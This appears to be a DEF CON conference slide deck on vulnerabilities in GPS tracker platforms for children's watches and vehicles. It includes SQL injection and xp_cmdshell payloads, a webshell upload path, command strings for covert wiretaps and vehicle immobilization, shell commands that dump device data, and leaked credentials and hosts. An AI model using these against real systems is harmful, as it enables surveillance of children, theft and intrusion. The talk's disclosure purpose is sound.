---
title: "Tracking the Trackers How We Took Over 36 Million GPS Devices Protecting Children and Vehicles"
speakers: ["Felipe Solferini", "Vangelis Stykas"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: null
source_pdf: "DEF CON 34/DEF CON 34 - Felipe Solferini, Vangelis Stykas - Tracking the Trackers How We Took Over 36 Million GPS Devices Protecting Children and Vehicles - v1.pptx"
pages: 91
sha256: "b6c81cdb7ddc40f381abe074e03941067437827ca9ebd40422532682fdd82882"
text_chars: 28742
ocr_pages: 0
has_ocr: false
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2"
converted_at: "2026-08-12T00:40:03Z"
---
# Tracking the Trackers How We Took Over 36 Million GPS Devices Protecting Children and Vehicles

**Speakers:** Felipe Solferini, Vangelis Stykas  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Felipe Solferini, Vangelis Stykas - Tracking the Trackers How We Took Over 36 Million GPS Devices Protecting Children and Vehicles - v1.pptx` (91 pages)


## Slide 1

###### B L A C K H A T U S A 2 0 2 6 · D E F C O N · 4 5 - M I N B R I E F I N G

#### **Tracking the Trackers**

How we took over 26 million GPS devices sold to protect children and vehicles

Vangelis Stykas · Felipe Solferini

45 CVEs / 19 critical / 9× CVSS 10.0

## Slide 2

T H E P I TC H

###### **“A GPS watch keeps your kid safe”**

**Real-time location** See your child on the way to school.

###### **SOS button**

One press dials the parents.

###### **Two-way calling**

Voice and video with the child.

###### **Geofence alerts**

Notify when they leave a zone.

One of the fastest-growing consumer IoT segments, a multi-billion-dollar market.

## Slide 3

T H E R E A L I T Y

###### **Every platform we tested can silently surveil the child it is sold to protect.**

Silent wiretap Forced video Covert photos Live GPS From a free account

## Slide 4

R E S E A RC H S C O P E **Three platforms. One supply chain.**

SETRACKER

**~10M**

children's watches · 39 brands · 20+ countries

SINOTRACK

**6M+**

vehicles · 73,875 accounts on one cluster

TKSTAR · THINKRACE

**20M+**

upstream OEM · 37+ white-label brands

76+ brands · 26M devices · 50+ countries

## Slide 5

W H AT W E A C H I E V E D **Four kinds of impact, all confirmed**

###### **Remote code execution**

NT AUTHORITY\SYSTEM on TKSTAR · xp_cmdshell on SinoTrack · unauth file-upload RCE on NewGPS2012.

###### **Vehicle immobilization**

Remote fuel cutoff, circuit kill, and door unlock on 6M+ vehicles via unauthenticated API.

###### **Mass child surveillance**

Silent wiretap, covert camera, forced video, live GPS on millions of minors, no real auth.

###### **Full platform takeover**

SinoTrack owned from demo/demo; superadmin in 2 API calls; SQLi to OS command execution.

## Slide 6

W H O I S O N T H E O T H E R E N D

###### **26 million endpoints are people who trusted a safety device.**

###### **Children 3–12**

The primary market for the watch platforms.

**Elderly wearers** Fall-detection and SOS wearables on the same backends.

**Family & fleet vehicles** Anti-theft trackers across Africa, Latin America, Asia.

## Slide 7

T H E C O M M O N T H R E A D

###### **The Shenzhen connection**

All three platforms come from the same Shenzhen supply chain, YQT / 3G Electronics, Thinkrace, and SinoTrack build the hardware and software sold under dozens of brand names.

SinoTrack and TKSTAR share the same database username, the same protocol adapters, and the same architectural failures.

shared DB username

###### **zhongkeGPS888**

Not three vendors. One ecosystem with three entry points.

## Slide 8

T H I S I S N O T T H E F I R S T WA R N I N G **Prior research & a standing ban**

2017 Germany's Federal Network Agency bans children's smartwatches as covert surveillance devices.

2019 Avast discloses flaws in the T8 Mini tracker exposing 500k+ users.

2022 BitSight finds hardcoded passwords in MiCODUS MV720 trackers.

ongoing BEUC repeatedly warns on flawed internet-connected children's toys.

## Slide 9

W H AT T H I S R E S E A R C H A D D S

###### **Ecosystem, not a product**

01 · Scale 02 · Depth 03 · Supply chain Three platforms, 100+ Full chains: RCE, mass data Tracing white-label lineage: brands, millions of devices, extraction, real physicalbrand diversity ≠ vendor assessed together. world impact. diversity.

## Slide 10

H O W W E D I D I T **Methodology**

01

02

###### **APK decompilation Protocol reconstruction**

jadx / apktool, endpoints, secrets, signing keysFAQSH, Thinkrace, Concox / JT808 / TRV

04

05

###### **Infrastructure mapping**

###### **Black-box testing**

Clusters, DB endpoints, CDN, regional failover IDOR, SQLi, command injection, auth bypass

03

###### **Server-side code audit**

Node.js source, decompiled .NET, ASP Classic

✓

###### **Ethical throughout**

Test accounts only. No user data exfiltrated.

## Slide 11

P L AT F O R M P R O F I L E · 1 O F 3 **SETracker** / myaqsh.com

|Vendor|YQT / 3G Electronics|Stack|Node.js (MAS) · MySQL RDS|
|---|---|---|---|
|Host|Alibaba Cloud, China|Regions|asia · eu · us · southam · vie · russ|
|White-label|46 apps / 39 brands|Target|children 3–12|
|Countries|20+|CVEs|16|

## Slide 12

P L AT F O R M P R O F I L E · 2 O F 3

###### **SinoTrack** / sinotrack.com

|Vendor|Shenzhen Sinotrack Tech|Stack|Classic ASP / IIS 8.5|
|---|---|---|---|
|Database|SQL Server 2012 (sysadmin)|Origin IP|45.112.204.218 (CF)|
|Global devices|6,000,000+|Assessed cluster|82,451 devices|
|Users (cluster)|73,875|CVEs|12|

## Slide 13

P L AT F O R M P R O F I L E · 3 O F 3 **NewGPS2012** / TKSTAR · Thinkrace

|Vendor|Shenzhen Thinkrace Tech|Stack|ASP.NET 4.0 / IIS|
|---|---|---|---|
|Domains|mytkstar.net · gps85 · gps18|Protocol|.NET SocketService · 43 adapters|
|White-label|37+ brands|Est. devices|20,000,000+|
|DB user|zhongkeGPS888|CVE candidates|17|

## Slide 14

T H E S C O R E B O A R D

###### **What we filed**

# **45**

CVE candidates

# **19**

rated Critical (9.0+)

**9**

at CVSS v3.1 10.0

**3/3** platforms with RCE

SETracker 16 · SinoTrack 12 · NewGPS2012 / TKSTAR 17

## Slide 15

C R O S S - P L AT F O R M C O R R E L AT I O N

###### **The same holes, three times over**

|Anti-pattern|SETracker|SinoTrack|TKSTAR|
|---|---|---|---|
|No device ownership checks|●|●|●|
|Hardcoded secrets in the APK|●|●|●|
|Unauthenticated device commands|●|●|●|
|Remote wiretap / camera|●|●|●|
|SQL injection to sysadmin|n/a|●|●|
|Default demo credentials|●|●|●|
|Prior compromise evidence|,|,|webshells|

## Slide 16

###### O N E A RC H I T E C T U R E **Same shape, same weak points**

GPS device ports 8002/8014/8898

↔ TCP protocol server ↔

Application server ↔ Mobile app / web HTTP / HTTPS API

A SQL database and a device command gateway sit behind the app server. Commands flow both directions, telemetry up, surveillance and control down.

## Slide 17

I N S E C U R E BY D E FA U LT

###### **The defaults do half the work for you**

Initialize.js, line 1

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0"

###### **TLS validation disabled globally**

Every outbound connection trusts any certificate. MITM is invited.

###### **160+ no-auth endpoints**

Filter.js whitelists registration, upload/download, payments, device binding.

## Slide 18

W H E R E W E A R E G O I N G

###### **Roadmap**

- 01 **SETracker, children's watches**

- 02 **SinoTrack, vehicles**

- 03 **TKSTAR / Thinkrace, the OEM**

- 04 **The brand illusion**

- 05 **Now what**

## Slide 19

01 SETracker

Children's watches · myaqsh.com

~10M devices · 39 brands · 20+ countries · 16 CVEs

## Slide 20

###### T H E W H I T E - L A B E L WA L L

###### **39 brands, one server**

|Wonlex|SaveFamily|Garett Kids|KidiWatch|Aimoto Smart|
|---|---|---|---|---|
|SafeKid|Beafon|Rebel Cactus|Carneo Guard|Osmile|
|Bilicra Care|Olivfant|Deplay|Kuus|+ 25 more|

###### all 39 → **myaqsh.com**

## Slide 21

R E C O V E R E D P R O D U C T I O N S O U R C E **Four files run the platform**

Filter.js

HTTP filter, auth, rate limit, attack detection. Whitelists 160+ no-auth endpoints.

8002.js · 41,000 lines

TCP handler for all 196+ D-code commands. Home of D4, shell, surveillance.

Initialize.js

Startup. Line 1 disables TLS cert verification globally.

MAS.js

App-server config with hardcoded database credentials.

## Slide 22

H A R D C O D E D S E C R E T S ( S E T- 0 5 ) **The authentication is client-side**

|Secret|Purpose|The signing algorithm:|
|---|---|---|
|SECRPRO|signs all API requests (triple MD5)||
|AQSH
3gtc|alternative signing key
super-admin username (u_id=1)|sign = md5(md5(md5(
"SECRPRO" + params + "SECRPRO"
)))|
|MySQL creds
Firebase keys|AWS RDS, full DB access
40+ push accounts, all brands|Shipped in every APK on Google Play. Anyone
can forge valid requests for any endpoint.|

## Slide 23

R E Q U E S T F O R G E RY I N P R A C T I C E

###### **A valid signature anyone can make**

POST /S10APP/v2_sendOrder

the signing scheme

sendurl = test?dev_id=1106229393 &com=D4&param1=FIND timestamppp = 1772226552590 sign_flag = KHDIW sign = <triple-MD5>

inner = join(sorted(params)) sign  = md5(md5(md5( "SECRPRO" + inner + "SECRPRO")))

SECRPRO ships in every APK. The signature proves nothing.

## Slide 24

T H E D 4 C O M M A N D I N J E C T I O N ( S E T- 0 1 ) **One line turns the whole protocol into an attack surface** 8002.js, the D4 handler cmd = [params.param1];

**v2_sendOrder** checks that the device is bound to your account. It never checks which command you send. Any bound parent, or anyone who forges the signature, can inject all 196+ commands.

## Slide 25

###### 1 9 6 + I N J E C TA B L E C O M M A N D S **The arsenal**

|MONITOR|silent wiretap, mic open|PRYVCALL
forced video, no notification|
|---|---|---|
|rcapture|silent photo capture|shell
OS command execution (Android watches)|
|UPGRADE|unsigned firmware push|IP
redirect device to attacker server|
|SOSSMS|replace emergency contacts|POWEROFF / FACTORY disable or wipe the device|

Plus their own WiGLE-style database of Wi-Fi access points for geolocation.

## Slide 26

C O N F I R M E D , E T H I C A L LY **Code 200: the command landed**

- { "dev_id": "1106229393", "com": "D4",

- "code": 200,

"current_utc_time": "2026-02-27 21:04:10" }

Validated with benign commands (FIND, VERNO) only. Delivery confirmed without harming any device or user.

## Slide 27

● L I V E D E M O

##### **Silent wiretap**

D4, MONITOR, +<attacker_phone>

The watch calls the attacker's number. Microphone open. No screen change, no LED, no audio alert. On any of 10M+ children's watches.

## Slide 28

FA Q S H P R O T O C O L ( S E T- 0 8 )

###### **Encryption in name only**

###### **XOR cipher**

Key derived from the 10-digit Device ID.

###### **DID sent in cleartext**

Transmitted during the KI handshake.

###### **No key rotation**

###### **No integrity check**

One key for the device's entire lifetime. No HMAC, no message authentication.

Capture the handshake → derive the key → decrypt all traffic. With the IP redirect command, that is a complete man-in-the-middle on any device.

## Slide 29

I D O R E N U M E R AT I O N ( S E T- 0 4 ) **10M devices, enumerable in ~46 hours**

v2_findDevicePhone SIM number for any device ID new_findUserDeviceByDid parent email + child name **60req/s** findDeviceListByUserId capability flags: camera, mic, video no rate limit, no lockout wx_checkLoginname account-existence oracle

## Slide 30

I D O R , W H AT I T A C T U A L LY Y I E L D S **Pick your target before you touch it**

**91**

capability flags returned per device:

CM:1 camera MT:1 wiretap

VS:3 v ideo

live SIM numbers from a 5,000-DID sample

Plus parent email, child name, and role (Dad / Mom / Admin) via new_findUserDeviceByDid.

## Slide 31

F U L L C H A I N

###### **App download to wiretap in 12 minutes**

|01|02|03|
|---|---|---|
|Register free account|Extract SECRPRO from APK|IDOR-enumerate device IDs|
|04|05|06|
|Resolve target: email + name|D4 MONITOR → wiretap|D4 PRYVCALL → video|
|07|08|✓|
|D4 rcapture → photos|D4 IP → persistence|Full audio/video surveillance|

## Slide 32

P E R S I S T E N C E & R C E ( S E T- 0 2 , S E T- 0 9 ) **It does not have to be temporary**

UPGRADE

shell

###### **Firmware persistence**

###### **Android RCE**

Accepts an arbitrary URL, no signature check. Attacker firmware survives a factory reset.

Seven Android watch models accept shell commands via D4, full OS command execution on a child's wrist.

## Slide 33

A N D R O I D R C E ( S E T- 0 2 ) · 7 WATC H M O D E L S **A rooted phone on a child's wrist**

|shell,|cat /data/data/*/databases/*|dump every app DB|
|---|---|---|
|shell,|content query --uri content://sms|read SMS|
|shell,|screencap -p /sdcard/sc.png|screenshot|
|shell,|settings put global http_proxy <ip>|MITM proxy|
|shell,|am start -a …CALL -d tel:<num>|force-dial|

Affected: A6 · K4 · A9 · C403 · AY10 · A11 · A12

## Slide 34

###### S O S N U M B E R H I J A C K I N G ( S E T- 1 0 ) **The child presses SOS, and reaches the attacker.**

D4, SOSSMS, +<attacker1>, +<attacker2>, +<attacker3>

Emergency contacts are overwritten with attacker-controlled numbers. The one feature parents rely on becomes a channel to the attacker.

## Slide 35

BY PA S S V E C T O R S ( S E T- 1 1 , S E T- 1 5 ) **Fixing D4 is not enough**

D4 D45 D199 D200 D201

Four wildcard command handlers, identical behavior. Authorization is enforced by the app UI only, the API trusts the client to behave. The real fix is **per-command authorization** .

## Slide 36

W I D E N I N G T H E B L A S T R A D I U S

###### **Beyond the watch itself**

SET-14 · APN manipulation

###### **MITM at the carrier layer**

Rewrite the cellular APN to route all device traffic through an attacker-controlled gateway.

SET-16 · smart-lock control

###### **A watch bug becomes a door bug**

The same watch protocol can actuate paired smart locks, no authentication on the command.

## Slide 37

G L O B A L A R C H I T E C T U R E

###### **Every region proxies to one master**

asia.myaqsh.com, MASTER
Alibaba Cloud, China · Node.js S10APP · MySQL AWS RDS
▲ proxied to ▲
europe us southam vie russ

Regional servers proxy to Asia for WiFi geolocation, cell-tower cache, device registry, and user accounts. There is no real data residency.

## Slide 38

S E T R A C K E R , R E C A P

###### **A free account owns any watch**

**16 196+** CVEs (4 critical) injectable commands

**0**

real per-command authz

Next: from the wrist to the road →

## Slide 39

02 SinoTrack

Vehicles · sinotrack.com

6M+ devices · 73,875 accounts (one cluster) · 12 CVEs

## Slide 40

T H E D E M O A C C O U N T P R O B L E M

###### **It all starts with one login**

demo / demo

A public demo account with no access restrictions. One endpoint, /APP/AppJson.asp , takes a command and its arguments, with no check that the caller owns the target.

**120** stored procedures<sup>**52**</sup>

hex device commands

## Slide 41

T H E AT TA C K S U R FA C E I S O N E U R L **Everything routes through AppJson.asp**

POST /APP/AppJson.asp   Cmd=<procedure|hex>  Data=<args>

stored procedures

**52**

hex device commands

**0**

ownership checks

**120**

## Slide 42

M A S S D ATA E X P O S U R E ( S T- 0 1 ) **The whole platform, from one account**

**73,875** plaintext passwords

**24,338** live GPS positions

**10,474** vehicle records + PII

**71**

superuser accounts

Geofences reveal home and office addresses. Every password stored in plaintext, no hashing, no salt (ST-10).

## Slide 43

V E H I C L E S A F E T Y R E L AY S ( S T- 0 3 · C V S S 1 0 . 0 ) **Direct control of the vehicle**

|Command|Hex|Physical action|
|---|---|---|
|Cut fuel|0x0204|engine dies|
|Cut circuit|0x0206|vehicle stops|
|Unlock door|0x021B|physical access|
|Disarm anti-theft|0x022C|silent approach|
|Forced shutdown|0x0268|tracking lost|

No ownership verification. Requires only demo login + target TEID.

## Slide 44

C O V E RT S U RV E I L L A N C E ( S T- 0 4 )

###### **The same spying suite, over hex**

|Hex|Action|
|---|---|
|0x0202|silent wiretap, device calls attacker|
|0x0203|live audio monitor|
|0x0266|covert camera capture|
|SMS inject|write arbitrary SMS to any device (ST-11)|

Personal & elderly trackers on the same backend, no ownership check, same as the vehicle relays.

## Slide 45

■ P R E - R E C O R D E D D E M O **Vehicle theft chain**

demo / demo → door unlocked 90 seconds Geographic search → owner PII → silence alarms → disarm → unlock. No registration, no payment, no device ownership.

## Slide 46

S Q L I N J E C T I O N T O R C E ( S T- 0 8 , S T- 0 9 · C V S S 1 0 . 0 ) **One endpoint, sysadmin**

the entire query

EXEC [Cmd_value] [Data_value]

WAITFOR DELAY 3,494 ms → injection confirmed IS_SRVROLEMEMBER 'sysadmin' = TRUE xp_cmdshell OS command execution confirmed

## Slide 47

P R O O F , W I T H T I M I N G S **Blind SQLi to OS command execution**

|…';WAITFOR DELAY '0:0:3'--|3,494 ms|injection ✓|
|---|---|---|
|IS_SRVROLEMEMBER('sysadmin')=1|3,470 ms|sysadmin ✓|
|sp_configure 'xp_cmdshell',1|,|enabled|
|xp_cmdshell 'ping -n 4 127.0.0.1'|3,531 ms|RCE ✓|

## Slide 48

S C O P E & H O N E S T L I M I T S

###### **What we saw, what we could not**

the box

egress limitation

###### **Windows Server 2012 R2**

64 GB RAM · 12 CPU cores · 1 TB disk. SQL connection runs as sysadmin.

###### **Outbound is firewalled**

Local command execution confirmed; network exfil blocked. Immaterial, IDOR already exposes all data via the API.

## Slide 49

P R I V I L E G E E S C A L AT I O N ( S T- 0 7 )

###### **Demo to superadmin in 2 calls**

- # 1, create superuser Cmd=Proc_AddSuperUser   Data=attacker,pass,0

# 2, elevate to unlimited quota Cmd=Proc_ModSuperUser   Data=attacker,pass,0,99999,99999

The new superadmin can create more superadmins, unlimited propagation that survives password resets.

## Slide 50

C L O U D F L A R E BY PA S S

###### **The origin is exposed anyway**

sinotrack.com resolves directly to → 45.112.204.218

The bare domain points at the origin, bypassing the WAF, rate limiting, and DDoS protection entirely.

## Slide 51

F U L L T H E F T C H A I N + R E A L - W O R L D I M PA C T **Locate, unlock, immobilize, go dark**

geo search → owner PII → pattern of life → silence alarms → unlock → tracker off

###### **Real fleets, real owners**

Exposed records are primarily Kenyan fleet vehicles with names, plates, and phone numbers.

###### **Safety of life**

Fuel cutoff (0x0204) can be sent to a vehicle in motion.

## Slide 52

P L A I N T E X T S T O R A G E ( S T- 1 0 , S T- 1 2 ) **Every password. In plaintext. No hash, no salt.**

**73,875** plaintext account passwords<sup>**123456**</sup> default password on all 10,474 devices

## Slide 53

C L U S T E R A R C H I T E C T U R E **Six front-ends, one database**

www 101 242 245 246
▼ all share ▼
one SQL Server (sysadmin)
6M+ devices · 73,875 users on the assessed cluster

Compromise one front-end and the shared backend exposes the entire cluster.

## Slide 54

C A S E S T U DY · N A I R O B I F L E E T **A repeatable theft playbook**

01 Proc_DragBoxFindCar every car in a Nairobi bounding box 02 Proc_CarMaintain owner name · plate · phone 03 Proc_GetTrack weeks of movement → pattern of life 04 0x022C → 0x021B disarm anti-theft, unlock doors 05 0x0268 power off tracker, owner gets no alert

No registration, no payment, no device ownership. Real owners, real plates.

## Slide 55

S I N O T R A C K , R E C A P

###### **demo / demo owns the platform**

**12 6M+** CVEs (9 critical) vehicles at risk

###### **RCE**

xp_cmdshell, sysadmin

Next: the OEM upstream of it all →

## Slide 56

03 TKSTAR · Thinkrace

The upstream OEM · NewGPS2012 20M+ devices · 37+ brands · 17 CVE candidates

## Slide 57

U P S T R E A M O E M **The OEM behind the OEMs**

The NewGPS2012 codebase powers TKSTAR and 37+ white-label brands. The same protocol adapters, KKS, JT808, TRV, Concox, appear in both this platform and SinoTrack.

shared DB username

**zhongkeGPS888**

Identical across SinoTrack and NewGPS2012, same codebase or deployment template.

## Slide 58

D E C O M P I L E D B I N A R I E S **Four assemblies, one verdict**

NewGPS2012.Logic.dll 716 KB 957 SQL strings, 56+ built by string concatenation. NewGPS2012.Framework.dll 56 KB DES with hardcoded key SRKJ1002, unsalted MD5.

NewGPS2012.Entity.dll 134 KB 89 entity classes with plaintext password fields.

SocketService.exe 401 KB

TCP handler, 43 protocol adapters, 12 injectable SQL patterns.

## Slide 59

C O D E B A S E A U D I T

###### **957 SQL strings in one DLL**

**277 56 3** parameterized (safe) string concatenation (vuln) String.Format (vuln)

Parameterized and injectable queries live in the same file. Plaintext passwords, DES with a hardcoded key SRKJ1002, unsalted MD5.

## Slide 60

7 5 + S Q L I N J E C T I O N P O I N T S

###### **Injectable across every function**

- 5 authentication bypass

- 12 device lookup by serial / IMEI

- 6 command-queue operations

- 6 user-account manipulation

- 3 financial ops, stacked queries, balance manipulation

56 in Logic.dll · 12 in SocketService.exe · 6 in VDataProcessing.DAL.dll.

## Slide 61

C O N F I R M E D R C E ( C C - 1 2 · C V S S 1 0 . 0 ) **All the way to SYSTEM**

- 01 APK → hardcoded key 7DU2DJFDR8321

- 02 Login 888 / 123456

- 03 SQLi in G etCommandList via SN param

- 04 Enable xp_cmdshell → whoami

- ✓ **NT AUTHORITY\SYSTEM**

DB: YiwenGPS · SQL user: yiwen196sa (sysadmin)

## Slide 62

T I M E - B A S E D B L I N D E X T R A C T I O N **Spelling out the whoami**

IF(ASCII(SUBSTRING((SELECT TOP 1 output FROM #tmp),1,1))=78) WAITFOR DELAY '0:0:3'-- # char 1 = 78 = 'N'

78→N 84→T → … → **NT AUTHORITY\SYSTEM**

DB: YiwenGPS · SQL user: yiwen196sa (sysadmin)

## Slide 63

U N A U T H E N T I C AT E D F I L E U P L O A D ( C C - 0 1 · C V S S 9 . 8 ) **A second, independent RCE**

POST /Ajax/UploadAjaxJYZ.aspx # no auth f i lename=" ../../shell.aspx " # path traversal

No authentication, no filename sanitization. Drop a webshell anywhere on disk. Confirmed execution as iis apppool\web.

## Slide 64

W I D E O P E N , A N D A L R E A DY B R E A C H E D **We were not the first ones here**

TCP :3456 · SecurityMode.None

cmdasp.rar · 2024-10-23

###### **WCF command service**

###### **Prior compromise**

Anyone on the network can send device commands by IMEI. No authentication at all.

Known webshells in the PicImages directory. The platform was already compromised before us.

## Slide 65

I N J E C TA B L E B E L O W T H E A P I ( C C - 0 2 ) **Even the TCP socket is injectable**

port 8014, send an IMEI, get SQLi

SELECT DeviceID FROM Devices WHERE SerialNumber='1234567890'; WAITFOR DELAY '0:0:5'--'

A 5-second delay from a raw socket confirms blind SQLi with no HTTP API involved. A second clean injection sits in the unauthenticated OpenAPIV4 DeleteWarn endpoint.

## Slide 66

H A R D C O D E D C R E D E N T I A L S ( C C - 0 4 )

###### **Eight+ secret sets, none rotating**

|Secret|Use|
|---|---|
|7DU2DJFDR8321|API key in the mobile APK|
|888 / 123456|demo login|
|SRKJ1002|DES encryption key|
|thinkrace@gmail / Top2000|SMTP credentials in code|
|zhongkeGPS888|shared MSSQL database login|

## Slide 67

P R O D U C T I O N E S TAT E

###### **The front door is propped open**

|Host|IP|Exposure|
|---|---|---|
|mytkstar.net|47.88.85.196|RCE|
|gps85.com|47.88.137.243|RDP exposed|
|device gateway|47.105.233.230|WCF :3456|
|new.gpscar.cn|primary web|dir browsing|

## Slide 68

T K S TA R , R E C A P

###### **Two roads to SYSTEM**

**17 75+** CVE candidates SQL injection points

###### **2024**

webshells found on-server

Next: why none of this is really about three vendors →

## Slide 69

04 The brand illusion

Brand diversity is not vendor diversity

## Slide 70

T H E C O N S U M E R T R A P **Switching brands changes nothing**

###### **Same backend**

Wonlex → SaveFamily is a sticker change. Both are myaqsh.com.

**Certs mislead** “CE certified” covers the hardware, not the backend security.

###### **Resellers blind**

Many do not know their product uses a shared backend from China.

## Slide 71

###### S H A R E D C R E D E N T I A L PAT T E R N S

###### **The same shortcuts, everywhere**

||SETracker|SinoTrack|TKSTAR|
|---|---|---|---|
|Default device pw|n/a|123456|123456|
|Admin pw|3gtc|admin|079027|
|SMTP creds in code|●|,|●|
|Shared DB user|adfhlshoews|zhongkeGPS888|zhongkeGPS888|

## Slide 72

S H A R E D P R O T O C O L C O D E **The same adapters in both platforms**

KKS JT808 TRV Concox

The CmdVT77.js and CmdCarBurglar.js files reference the exact model numbers (VT77 / VT88 / VT99) and command codes used in SinoTrack's API. Same lineage, different labels.

## Slide 73

D ATA S O V E R E I G N T Y

###### **A European-branded watch sends your child's location to Shenzhen.**

EU-branded watch

→ → asia.myaqsh.com Alibaba Cloud, China

No GDPR disclosure. Regional servers proxy back to the Asia master.

## Slide 74

T H E S H A R E D D N A

### **zhongkeGPS888**

The identical database username in both SinoTrack and NewGPS2012.

Two “independent” vendors. One codebase lineage.

## Slide 75

S E V E R I T Y D I S T R I B U T I O N **Nothing below High**

## **19**

Critical (9.0–10.0) SET 4 · ST 9 · CC 6

## **26**

High (7.0–8.9) SET 12 · ST 3 · CC 11

**0**

Low / Medium

## Slide 76

C O N F I R M E D V S . E S T I M AT E D

###### **How big is this, really?**

|Platform|Confirmed|Ecosystem|
|---|---|---|
|SETracker|~10M DIDs|millions|
|SinoTrack|82,451|6,000,000+|
|NewGPS2012 / TKSTAR|4,612+|20,000,000+|
|**Combined**|**~10.1M**|**~36M+**|

## Slide 77

T H E D I S C L O S U R E P R O B L E M

###### **One bug. 39 brands. 20+ jurisdictions. One vendor who can actually fix it.**

1 backend bug → 39 consumer brands → a recall fixes only one

## Slide 78

R E G U L AT O RY I M P L I C AT I O N S **Broken law in every jurisdiction**

###### **GDPR (EU)**

Children's location = special-category data (Art. 9). Undisclosed transfer to China breaches Art. 13/14.

###### **Wiretap laws**

MONITOR / PRYVCALL violate 18 U.S.C. § 2511, ePrivacy, and equivalents.

###### **COPPA (US)**

Location, photos, and audio from under-13s with no verifiable parental consent.

###### **The disclosure problem**

One bug → 39 brands, 20+ jurisdictions. A national recall fixes one; the rest stay open.

## Slide 79

T H E W H O L E TA L K , I N F O U R N U M B E R S

**26M 76+ 45 0**

devices brands

CVEs real authentication

## Slide 80

T H R E AT M O D E L R E F R A M E **The threat is not a nation-state.** It is a stalker, an abusive ex, or a predator, with a free account and a public APK. No budget, no zero-day, no skill barrier.

## Slide 81

05 Now what

Guidance for parents, defenders, and operators

## Slide 82

F O R PA R E N T S

###### **Assume compromise**

- 01 Assume your child's watch is compromised. The vulnerability density is too high to trust any current product. 02 Power it off when tracking is not essential, bedtime, indoors, at home.

- 03 Do not rely on the SOS button, contacts can be remotely hijacked.

- 04 Check the backend. If the app talks to myaqsh.com, sinotrack.com, or gpsxitong.com, this applies to you.

## Slide 83

F O R N E T W O R K D E F E N D E R S , I O C S

###### **What to watch for**

|Platform|Signature|
|---|---|
|SETracker|*.myaqsh.com : 8081/8101/8002 ·com=D4&param1=|
|SETracker|KI handshake pattern[CS*<10 digits>*|
|SinoTrack|45.112.204.218 ·WAITFOR DELAY / xp_cmdshell|
|SinoTrack|hex commands0x02xxto non-owned devices|
|TKSTAR|mytkstar.net / gps85.com · WCF:3456|

## Slide 84

F O R P L AT F O R M O P E R AT O R S

###### **None of this is exotic**

- ✓ Per-command authorization, every command type

- ✓ Enable TLS validation & cert pinning

- ✓ Hash passwords (Argon2 / bcrypt), delete plaintext

- ✓ Kill hardcoded secrets → HSM-backed secrets

- ✓ Parameterize every SQL query

- ✓ Rate limit per-user, per-endpoint; segment the architecture

## Slide 85

C O O R D I N AT E D D I S C L O S U R E **Handled responsibly**

|2026-02-27|SETracker assessment begins|
|---|---|
|2026-03-01|SinoTrack assessment begins|
|2026-03-12|Assessment concludes, findings validated|
|TBD|Vendor notification · CVE reservations · CISA ICS-CERT|
|+90 days|Public disclosure|

## Slide 86

F U T U R E R E S E A RC H

###### **Where this goes next**

01

Firmware analysis, OTA, FAQSH, Android runtime

04

Cross-vendor device redirection (shared adapters)

02 Cellular attacks, APN & modem control

05

Passive detection tooling for D4 / hex abuse

03

Expand the brand-to-backend map

06 Do MiCODUS, Queclink, Coban share the lineage?

## Slide 87

###### F U L L C V E C ATA L O G · S E T R A C K E R ( 1 6 )

|SET-01|D4 TCP command injection|8.8|SET-09|Malicious firmware push|9.1|
|---|---|---|---|---|---|
|SET-02|RCE via SHELL (Android)|9.1|SET-10|SOS number hijacking|8.6|
|SET-03|Device redirection|9.1|SET-11|Wildcard bypass D45/D199+|8.8|
|SET-04|IDOR phone enumeration|7.5|SET-12|Silent camera capture|8.1|
|SET-05|Hardcoded crypto secret|9.8|SET-13|Device destruction|7.1|
|SET-06|Silent wiretap (MONITOR)|8.1|SET-14|Cellular APN manipulation|8.1|
|SET-07|Forced video (PRYVCALL)|8.1|SET-15|Missing per-cmd authz|8.8|
|SET-08|Weak encryption (FAQSH)|7.4|SET-16|Smart-lock remote control|7.6|

## Slide 88

###### F U L L C V E C ATA L O G · S I N O T R A C K ( 1 2 )

|ST-01|Mass IDOR, all platform data|9.1|ST-07|Priv esc, demo to superadmin|9.8|
|---|---|---|---|---|---|
|ST-02|Unauth device control|9.8|ST-08|SQLi sysadmin, stacked|10.0|
|ST-03|Vehicle safety relay control|10.0|ST-09|RCE via xp_cmdshell|10.0|
|ST-04|Covert surveillance|9.8|ST-10|Plaintext passwords|7.5|
|ST-05|Device network hijacking|9.8|ST-11|SMS injection to any device|8.6|
|ST-06|Safety feature disablement|9.1|ST-12|Default device pw 123456|8.1|

## Slide 89

###### F U L L C V E C ATA L O G · N E W G P S 2 0 1 2 / T K S TA R ( 1 7 )

|CC-01|Unauth file upload (RCE)|9.8|
|---|---|---|
|CC-02|SQLi in DeleteWarn|9.8|
|CC-03|Plaintext passwords|9.1|
|CC-04|Hardcoded DB credentials|9.1|
|CC-05|Directory browsing|7.5|
|CC-06|IMEI auth, no rate limit|8.1|
|CC-07|Insecure session state|7.4|
|CC-08|Unauth camera access|7.5|
|CC-09|IDOR in all ASMX APIs|8.6|

|CC-10|WCF service, no security|7.5|
|---|---|---|
|CC-11|2nd file-upload handler|8.8|
|CC-12|SQLi GetCommandList → SYSTEM|10.0|
|CC-13|Hardcoded API key in APK|8.6|
|CC-14|SQL Server as SYSTEM|9.0|
|CC-15|Default demo accounts|8.1|
|CC-16|RDP exposed on prod|7.3|
|CC-17|Multi-tenant, no isolation|8.1|

## Slide 90

● L I V E D E M O **The brand shuffle**

Five watches. Five brands. “Which one is safest?”

5 brands, one Wireshark capture

→ all connect to myaqsh.com

## Slide 91

T H A N K YO U **Brand diversity is not vendor diversity.** Full PoC chains, the CVE catalog, and the brand-to-backend mapping are in the whitepaper.

Vangelis Stykas · Felipe Solferini Coordinated disclosure · 90-day deadline · CISA ICS-CERT notified

Questions?
